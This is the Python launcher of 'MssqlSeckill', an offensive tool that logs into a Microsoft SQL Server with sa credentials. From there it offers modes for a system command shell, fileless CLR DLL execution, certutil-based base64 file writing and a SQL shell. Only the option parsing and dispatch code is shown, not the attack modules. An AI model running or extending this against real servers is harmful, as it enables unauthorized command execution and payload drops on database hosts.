# -*- coding: utf-8 -*
# !/usr/bin/python3
from optparse import OptionParser
import config
import get_dbinfo
import mssql_exec
import mssql_clr
import mssql_certutil
import sql_shell


def mean():
    title = """
    
#  $$\      $$\                               $$\  $$$$$$\                      $$\       $$\ $$\ $$\ 
#  $$$\    $$$ |                              $$ |$$  __$$\                     $$ |      \__|$$ |$$ |
#  $$$$\  $$$$ | $$$$$$$\  $$$$$$$\  $$$$$$\  $$ |$$ /  \__| $$$$$$\   $$$$$$$\ $$ |  $$\ $$\ $$ |$$ |
#  $$\$$\$$ $$ |$$  _____|$$  _____|$$  __$$\ $$ |\$$$$$$\  $$  __$$\ $$  _____|$$ | $$  |$$ |$$ |$$ |
#  $$ \$$$  $$ |\$$$$$$\  \$$$$$$\  $$ /  $$ |$$ | \____$$\ $$$$$$$$ |$$ /      $$$$$$  / $$ |$$ |$$ |
#  $$ |\$  /$$ | \____$$\  \____$$\ $$ |  $$ |$$ |$$\   $$ |$$   ____|$$ |      $$  _$$<  $$ |$$ |$$ |
#  $$ | \_/ $$ |$$$$$$$  |$$$$$$$  |\$$$$$$$ |$$ |\$$$$$$  |\$$$$$$$\ \$$$$$$$\ $$ | \$$\ $$ |$$ |$$ |
#  \__|     \__|\_______/ \_______/  \____$$ |\__| \______/  \_______| \_______|\__|  \__|\__|\__|\__|
#                                         $$ |                                                        
#                                         $$ |                                                        
#                                         \__|                                                                                                   

                                 Author:Se10rc||CL0ud1
    """

    print(title)
    parse = OptionParser()
    parse.add_option('-i', dest='host', help='IP地址')
    parse.add_option('-p', dest='port', help='端口')
    parse.add_option('-u', dest='username', help='用户名(sa)')
    parse.add_option('-P', dest='passwd', help='密码')
    parse.add_option('-d', dest='database', help='数据库名')
    parse.add_option('-f', dest='path', help='写入文件地址')
    parse.add_option('-m', dest='modle', help='模式选项(e(shll模式),c(clr不落地执行模式),b(base64文件写入模式)),s(sql语句执行模式)')
    (options, args) = parse.parse_args()
    info = {
        'host': str(options.host),
        'port': str(options.port),
        'username': str(options.username),
        'passwd': str(options.passwd),
        'database': str(options.database),
        'path': str(options.path),
        'modle': str(options.modle)
    }
    return info


def main():
    info = mean()
    sqlcoon = config.mssql_connect(host=info['host'], port=info['port'], username=info['username'],
                                   password=info['passwd'],
                                   database=info['database']).mssql_conent()
    get_dbinfo.get_dbinfo(coon=sqlcoon,model=info['modle']).get_mssqlinfo()

    if info['modle'].upper() == 'E':
        shell = mssql_exec.shell(coon=sqlcoon)
    elif info['modle'].upper() == 'C':
        mssql_clr.mssql_clr(coon=sqlcoon,dll_ptah=info['path']).clr_exec()
    elif info['modle'].upper() == 'B':
        mssql_certutil.mssql_certutil(coon=sqlcoon,exe_path=info['path']).put_base64()
    elif info['modle'].upper() == 'S':
        sql_shell.sql_shell(coon=sqlcoon)
    else:
        print("[-]模式选择错误，程序退出")
        quit()



if __name__ == '__main__':
    main()
